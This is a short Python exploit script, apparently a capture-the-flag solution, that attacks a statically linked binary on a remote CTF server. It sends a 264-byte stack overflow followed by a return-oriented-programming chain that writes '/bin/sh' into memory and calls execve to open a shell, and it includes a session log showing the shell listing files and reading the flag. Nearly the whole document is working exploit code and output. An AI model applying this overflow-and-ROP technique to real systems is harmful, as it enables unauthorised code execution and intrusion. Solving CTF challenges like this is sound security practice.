from roppy import *

p = remote("jh2i.com", 50002)

# flag{radically_statically_roppingly_vulnerable}


pop_rdi = p64(0x40187a)
syscall = p64(0x40eda4)
pop_rdx = p64(0x40177f)
pop_rsi = p64(0x407aae)
pop_rax = p64(0x43f8d7)
bss     = p64(0x4ae310)

payload = b"a"*264
payload += pop_rdi
payload += p64(0)
payload += pop_rsi
payload += bss
payload += pop_rdx
payload += p64(0x8)
payload += pop_rax
payload += p64(0x0)
payload += syscall

payload += pop_rdi
payload += bss
payload += pop_rsi
payload += p64(0x0)
payload += pop_rdx
payload += p64(0x0)
payload += pop_rax
payload += p64(59)
payload += syscall


p.recvline()
p.sendline(payload)
p.sendline("/bin/sh\x00")

'''
0 [07:44:40] vagrant@oracle(oracle) pwn> python3 sad.py 
[+] Opening connection to jh2i.com on port 50002: Done
[*] Switching to interactive mode
$ ls
flag.txt
sad
$ cat flag.txt
flag{radically_statically_roppingly_vulnerable}
$ 
[*] Interrupted
[*] Closed connection to jh2i.com port 50002
'''

p.interactive()
